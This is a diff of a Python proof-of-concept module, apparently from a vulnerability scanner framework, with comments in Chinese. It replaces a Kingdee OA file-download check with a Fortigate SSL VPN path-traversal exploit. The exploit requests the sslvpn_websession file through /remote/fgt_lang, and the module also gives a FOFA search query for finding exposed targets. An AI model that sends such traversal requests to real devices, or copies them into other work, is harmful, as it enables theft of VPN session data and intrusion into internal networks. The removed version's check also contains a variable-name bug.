@@ -10,25 +10,25 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "2",                    # POC版本，默认是1  
-        "CreateDate" : "2021-06-09",        # POC创建时间
-        "UpdateDate" : "2021-06-09",        # POC创建时间
+        "version" : "1",                    # POC版本，默认是1  
+        "CreateDate" : "2022-01-01",        # POC创建时间
+        "UpdateDate" : "2022-01-01",        # POC创建时间
         "PocDesc" : """
-            v1:不一定靠谱，笔者没扫出来  
-            v2:可能依旧不靠谱，但至少误报会少一些了  
+        略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "金蝶协同办公系统 fileDownload.do 任意文件下载漏洞",                        # 漏洞名称
-        "VulnID" : "wooyun-2015-0150077",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "金蝶协同办公系统",                     # 漏洞应用名称
+        "name" : "Fortigate SSL VPN fgt_lang 任意文件读取",                        # 漏洞名称
+        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "Fortigate SSL VPN",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
-        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        
+            Fortinet将其SSL VPN产品线称为Fortigate SSL VPN,主要应用于最终用户以及中型企业。
+            目前互联网上这些服务器的数量已超过48万台,主要集中在亚洲及欧洲区域。FortinetSSL VPN系统存在任意文件读取漏洞，攻击者通过漏洞可以通过VPN进入内网，导致内网失陷。
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="Kingdee-EAS"
+            app="FORTINET-SSLVPN"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -43,11 +43,12 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml" # url自己按需调整
+        url = self.target + "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" # url自己按需调整
         
 
-        headers = {"User-Agent":get_random_ua(),
-                    "Connection":"Keep-Alive",
+        headers = {
+                    "User-Agent":get_random_ua(),
+                    "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -56,9 +57,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and\
-                 "<?xml version=" in req.text and\
-                      "<web-app version=\"2.4\" xmlns=\"http://java.sun.com/xml/ns/j2ee\"" in rep.text:
+            if "var fgt_lang" in req.text and req.status_code == 200 :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
